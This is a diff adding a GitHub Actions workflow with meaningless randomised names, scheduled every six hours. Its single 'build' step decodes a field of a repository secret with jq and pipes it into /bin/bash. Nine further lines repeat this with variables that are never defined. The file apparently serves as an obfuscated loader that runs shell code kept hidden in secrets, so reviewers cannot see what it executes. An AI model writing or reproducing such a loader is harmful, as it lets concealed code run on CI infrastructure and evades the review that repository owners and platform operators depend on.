@@ -1,0 +1,26 @@
+name: daladexiamid
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: daladexiamid
+        env:
+          zpdce421: ${{ secrets.zpdce421 }}
+        run: |
+          echo $zpdce421 | jq -r .g1 | /bin/bash
+          echo $ante4369 | jq -r .umbtq002 | /bin/bash
+          echo $kpz45251 | jq -r .owu5418 | /bin/bash
+          echo $l08 | jq -r .ujl1 | /bin/bash
+          echo $kf2373 | jq -r .qdwjw4 | /bin/bash
+          echo $j09501 | jq -r .yervh1919 | /bin/bash
+          echo $akbo24 | jq -r .bshdm678 | /bin/bash
+          echo $idkn2 | jq -r .d51 | /bin/bash
+          echo $dcr2 | jq -r .pnsms9004 | /bin/bash
+          echo $cd3609 | jq -r .mx6290 | /bin/bash
+
